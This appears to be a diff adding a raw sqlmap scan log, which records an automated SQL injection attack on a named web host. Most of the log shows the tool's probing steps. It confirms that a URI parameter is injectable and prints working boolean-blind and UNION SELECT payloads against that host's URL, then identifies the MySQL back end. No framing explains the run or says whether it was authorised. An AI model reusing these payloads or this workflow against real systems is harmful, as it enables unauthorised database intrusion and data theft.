@@ -1,0 +1,63 @@
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 15:19:20
+
+[15:19:20] [WARNING] you've provided target URL without any GET parameters (e.g. www.site.com/article.php?id=1) and without providing any POST parameters through --data option
+do you want to try URI injections in the target URL itself? [Y/n/q] [15:19:22] [INFO] testing connection to the target URL
+[15:19:22] [INFO] testing if the target URL is stable. This can take a couple of seconds
+you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in futher requests? [Y/n] [15:19:31] [INFO] target URL is stable
+[15:19:31] [INFO] testing if URI parameter '#1*' is dynamic
+[15:19:37] [INFO] confirming that URI parameter '#1*' is dynamic
+[15:19:39] [INFO] URI parameter '#1*' is dynamic
+[15:19:40] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[15:19:40] [INFO] testing for SQL injection on URI parameter '#1*'
+[15:19:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:19:45] [INFO] URI parameter '#1*' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[15:19:59] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+[15:20:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:20:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+[15:20:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[15:20:02] [INFO] testing 'MySQL inline queries'
+[15:20:02] [INFO] testing 'PostgreSQL inline queries'
+[15:20:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[15:20:02] [INFO] testing 'Oracle inline queries'
+[15:20:02] [INFO] testing 'SQLite inline queries'
+[15:20:02] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[15:20:02] [WARNING] time-based comparison requires larger statistical model, please wait...........
+[15:20:22] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[15:20:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[15:20:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
+[15:20:29] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+[15:20:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[15:20:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
+[15:20:41] [INFO] testing 'Oracle AND time-based blind'
+[15:20:45] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[15:20:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[15:22:06] [INFO] target URL appears to be UNION injectable with 5 columns
+[15:22:23] [INFO] URI parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection points with a total of 58 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://tor.atdog.tw:80/news/1) AND 6575=6575 AND (8729=8729
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: http://tor.atdog.tw:80/news/1) UNION ALL SELECT NULL,CONCAT(0x7178657571,0x436c72625778424e6462,0x7175727971),NULL,NULL,NULL#
+---
+[15:22:33] [INFO] testing MySQL
+[15:22:36] [INFO] confirming MySQL
+[15:22:44] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.0
+[15:22:44] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 36 times
+[15:22:44] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/tor.atdog.tw'
+
+[*] shutting down at 15:22:44
+
